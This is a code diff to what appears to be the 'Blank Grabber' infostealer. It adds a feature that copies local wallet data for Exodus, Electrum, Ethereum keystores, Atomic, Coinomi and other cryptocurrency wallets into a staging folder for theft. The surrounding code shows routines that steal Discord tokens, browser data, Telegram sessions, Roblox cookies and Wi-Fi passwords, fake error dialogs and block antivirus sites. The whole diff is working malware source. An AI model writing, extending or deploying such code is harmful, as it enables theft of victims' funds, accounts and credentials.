@@ -40,6 +40,7 @@ class Settings:
     CaptureSystemInfo = bool("%capturesysteminfo%")
     CaptureScreenshot = bool("%capturescreenshot%")
     CaptureTelegram = bool("%capturetelegram%")
+    CaptureWallets = bool("%capturewallets%")
 
     FakeError = (bool("%fakeerror%"), ("%title%", "%message%", "%icon%"))
     BlockAvSites = bool("%blockavsites%")
@@ -276,6 +277,44 @@ class Utility:
         newdata = "\n".join(newdata).replace("\n\n", "\n")
         with open(hostfilepath, "w") as file:
             file.write(newdata)
+
+class Wallets:
+    APPDATA = os.getenv("appdata")
+    LOCALAPPDATA = os.getenv("localappdata")
+    
+    @staticmethod
+    def SaveWallets(saveToDir: str) -> int:
+        count = 0
+        wallets = (
+            ("Zcash", os.path.join(Wallets.APPDATA, "Zcash")),
+            ("Armory", os.path.join(Wallets.APPDATA, "Armory")),
+            ("Bytecoin", os.path.join(Wallets.APPDATA, "Bytecoin")),
+            ("Jaxx", os.path.join(Wallets.APPDATA, "com.liberty.jaxx", "IndexedDB", "file_0.indexeddb.leveldb")),
+            ("Exodus", os.path.join(Wallets.APPDATA, "Exodus", "exodus.wallet")),
+            ("Ethereum", os.path.join(Wallets.APPDATA, "Ethereum", "keystore")),
+            ("Electrum", os.path.join(Wallets.APPDATA, "Electrum", "wallets")),
+            ("AtomicWallet", os.path.join(Wallets.APPDATA, "atomic", "Local Storage", "leveldb")),
+            ("Guarda", os.path.join(Wallets.APPDATA, "Guarda", "Local Storage", "leveldb")),
+            ("Coinomi", os.path.join(Wallets.LOCALAPPDATA, "Coinomi", "Coinomi", "wallets")),
+        )
+
+        for name, path in wallets:
+            if os.path.isdir(path):
+                _saveToDir = os.path.join(saveToDir, name)
+                os.makedirs(_saveToDir, exist_ok= True)
+                try:
+                    shutil.copytree(path, os.path.join(_saveToDir, os.path.basename(path)), dirs_exist_ok= True)
+                    with open(os.path.join(_saveToDir, "Location.txt"), "w") as file:
+                        file.write(path)
+                except Exception:
+                    try:
+                        shutil.rmtree(_saveToDir)
+                    except Exception:
+                        pass
+                else:
+                    count += 1
+        
+        return count
 
 class Browsers:
 
@@ -723,6 +762,7 @@ class BlankGrabber:
     MinecraftSessions: int = 0
     WebcamPictures: int = 0
     TelegramSessions: int = 0
+    WalletsCount: int = 0
 
     def __init__(self) -> None:
         self.Separator = "\n\n" + "Blank Grabber".center(50, "=") + "\n\n"
@@ -742,6 +782,7 @@ class BlankGrabber:
             (self.StealBrowserData, False),
             (self.StealDiscordTokens, False),
             (self.StealTelegramSessions, False),
+            (self.StealWallets, False),
             (self.StealMinecraft, False),
             (self.GetAntivirus, False),
             (self.GetClipboard, False),
@@ -809,6 +850,12 @@ class BlankGrabber:
             os.makedirs(saveToDir, exist_ok= True)
             with open(os.path.join(saveToDir, "Roblox Cookies.txt"), "w") as file:
                 file.write("{}{}{}".format(note, self.Separator, self.Separator.join(self.RobloxCookies)))
+    
+    @Errors.Catch
+    def StealWallets(self) -> None:
+        if Settings.CaptureWallets:
+            saveToDir = os.path.join(self.TempFolder, "Wallets")
+            self.WalletsCount += Wallets.SaveWallets(saveToDir)
     
     @Errors.Catch
     def StealSystemInfo(self) -> None:
@@ -1155,6 +1202,7 @@ class BlankGrabber:
                             "History" : len(self.History),
                             "Roblox Cookies" : len(self.RobloxCookies),
                             "Telegram Sessions" : self.TelegramSessions,
+                            "Wallets" : self.WalletsCount,
                             "Wifi Passwords" : len(self.WifiPasswords),
                             "Minecraft Sessions" : self.MinecraftSessions,
                             "Screenshot" : self.Screenshot,
